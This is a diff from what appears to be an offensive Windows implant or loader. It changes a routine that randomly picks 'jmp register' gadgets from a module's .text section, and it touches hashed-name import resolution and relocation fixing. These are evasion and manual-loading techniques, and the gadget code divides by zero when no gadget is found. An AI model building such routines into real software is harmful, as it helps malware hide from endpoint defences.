@@ -127,19 +127,26 @@ auto DECLFN Useful::FindGadget(
     _In_ UPTR   ModuleBase,
     _In_ UINT16 RegValue
 ) -> UPTR {
-    UPTR   Gadget      = 0;
-    BYTE*  SearchBase  = NULL;
-    SIZE_T SearchSize  = 0;
-    UINT16 JmpValue    = 0xff;
+    UPTR   Gadget         = 0;
+    UPTR   GadgetList[10] = { 0 };
+    ULONG  GadgetCounter  = 0;
+    ULONG  RndIndex       = 0;
+    BYTE*  SearchBase     = nullptr;
+    SIZE_T SearchSize     = 0;
+    UINT16 JmpValue       = 0xff;
 
     SearchBase = B_PTR( ModuleBase + 0x1000 );
-    SearchSize = 0x1000 * 0x1000;    
+    SearchSize = this->SecSize( ModuleBase, Hsh::Str<CHAR>(".text") );;    
 
     for ( INT i = 0; i < SearchSize - 1; i++ ) {
         if ( SearchBase[i] == JmpValue && SearchBase[i+1] == RegValue ) {
-            Gadget = U_PTR( SearchBase + i ); break;
+            GadgetList[GadgetCounter] = U_PTR( SearchBase + i ); GadgetCounter++;
+            if ( GadgetCounter == 10 ) break;
         }
     }
+
+    RndIndex = Rnd32() % GadgetCounter;
+    Gadget   = GadgetList[RndIndex];
 
     return Gadget;
 }
@@ -167,7 +174,7 @@ auto DECLFN Useful::FixImp(
 		PIMAGE_THUNK_DATA OriginThunk = (PIMAGE_THUNK_DATA)( U_PTR( Base ) + ImpDesc->OriginalFirstThunk );
 
 		PCHAR  DllName     = A_PTR( U_PTR( Base ) + ImpDesc->Name );
-        PVOID  DllBase     = C_PTR( LdrLoad::Module( Hsh::Str<CHAR>( DllName ) ) );
+        PVOID  DllBase     = PTR( LdrLoad::Module( Hsh::Str<CHAR>( DllName ) ) );
 
         PVOID  FunctionPtr = 0;
         STRING AnsiString  = { 0 };
@@ -320,7 +327,7 @@ auto DECLFN Useful::FixRel(
             case IMAGE_REL_TYPE:
                 C_DEF64( RelocPtr + RelocInf->Offset ) += (ULONG_PTR)( Delta ); break;
             case IMAGE_REL_BASED_HIGHLOW:
-                C_DEF32( RelocPtr + RelocInf->Offset ) += (DWORD)( Delta ); break;
+                DEF32( RelocPtr + RelocInf->Offset ) += (DWORD)( Delta ); break;
             case IMAGE_REL_BASED_HIGH:
                 C_DEF16( RelocPtr + RelocInf->Offset ) += HIWORD( Delta ); break;
             case IMAGE_REL_BASED_LOW:
